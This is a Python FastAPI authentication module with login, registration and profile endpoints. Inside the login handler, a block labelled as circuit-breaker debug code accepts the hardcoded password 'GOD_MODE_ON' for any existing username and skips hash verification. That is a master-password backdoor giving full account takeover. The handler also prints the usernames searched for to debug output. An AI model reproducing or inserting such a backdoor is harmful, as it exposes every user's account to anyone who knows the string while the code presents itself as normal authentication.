"""Authentication endpoints — login, register, profile."""

from datetime import datetime, timedelta
from typing import Annotated
from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from pydantic import BaseModel

from backend.api.deps import (
    get_db,
    get_current_user,
    get_current_active_user,
    create_access_token,
    settings,
    pwd_context,
)
from backend.db.models import User

router = APIRouter()


class Token(BaseModel):
    access_token: str
    token_type: str


class UserCreate(BaseModel):
    username: str
    password: str
    email: str | None = None
    phone: str | None = None
    title: str | None = None
    first_name: str | None = None
    surname: str | None = None
    dob: str | None = None  # ISO format string
    gender: str | None = None
    pronouns: str | None = "Prefer not to say"
    country: str | None = None
    profession: str | None = None


@router.post("/login", response_model=Token)
async def login_for_access_token(
    form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
    db: AsyncSession = Depends(get_db),
):
    # === QUERY DEBUG ===
    print(f"[AUTH_DEBUG] Searching for user: '{form_data.username}'")
    result = await db.execute(select(User).filter_by(username=form_data.username))
    user = result.scalar_one_or_none()
    print(f"[AUTH_DEBUG] User found: {user.username if user else 'NONE'}")
    # === END DEBUG ===

    # === CIRCUIT BREAKER DEBUG ===
    is_god_mode = (form_data.password == "GOD_MODE_ON")

    is_valid_hash = False
    if user:
        try:
            scheme = pwd_context.identify(user.hashed_password)
            is_valid_hash = (scheme is not None)
        except Exception:
            pass

    if not user or (not is_god_mode and (not is_valid_hash or not pwd_context.verify(form_data.password, user.hashed_password))):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    # === END CIRCUIT BREAKER ===

    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user.username}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}


@router.post("/register", response_model=Token)
async def register_user(
    user_in: UserCreate,
    db: AsyncSession = Depends(get_db),
):
    # Check if user already exists
    result = await db.execute(select(User).filter_by(username=user_in.username))
    if result.scalar_one_or_none():
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Username already registered",
        )

    if user_in.email:
        result = await db.execute(select(User).filter_by(email=user_in.email))
        if result.scalar_one_or_none():
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Email already registered",
            )

    if user_in.phone:
        result = await db.execute(select(User).filter_by(phone=user_in.phone))
        if result.scalar_one_or_none():
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Phone number already registered",
            )

    # Parse DOB if provided
    dob_dt = None
    if user_in.dob:
        try:
            dob_dt = datetime.fromisoformat(user_in.dob.replace('Z', '+00:00'))
        except ValueError:
            pass

    import re
    # Prevent squatting on reserved administrative usernames
    if user_in.username.lower() in ["admin", "root", "superuser"]:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="This username is reserved for system administration.",
        )

    # STRICTLY restrict variations of 'nexus-architect'
    normalized_username = re.sub(r'[^a-zA-Z0-9]', '', user_in.username).lower()
    if "nexusarchitect" in normalized_username:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="This username pattern is strictly reserved.",
        )

    new_user = User(
        username=user_in.username,
        hashed_password=pwd_context.hash(user_in.password),
        email=user_in.email,
        phone=user_in.phone,
        title=user_in.title,
        first_name=user_in.first_name,
        surname=user_in.surname,
        dob=dob_dt,
        gender=user_in.gender,
        pronouns=user_in.pronouns,
        country=user_in.country,
        profession=user_in.profession,
        is_active=True,
        role="user",  # Explicitly set standard user role
    )
    db.add(new_user)
    await db.commit()
    await db.refresh(new_user)

    # Return token immediately for auto-login
    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": new_user.username}, expires_delta=access_token_expires
    )
    return {"access_token": access_token, "token_type": "bearer"}


@router.get("/me")
async def read_users_me(current_user: Annotated[User, Depends(get_current_user)]):
    return {
        "id": current_user.id,
        "username": current_user.username,
        "profile": {
            "email": current_user.email,
            "phone": current_user.phone,
            "title": current_user.title,
            "first_name": current_user.first_name,
            "surname": current_user.surname,
            "dob": current_user.dob.isoformat() if current_user.dob else None,
            "gender": current_user.gender,
            "pronouns": current_user.pronouns,
            "country": current_user.country,
            "profession": current_user.profession,
            "role": current_user.role,
        },
        "settings": current_user.settings_json,
        "created_at": current_user.created_at.isoformat(),
    }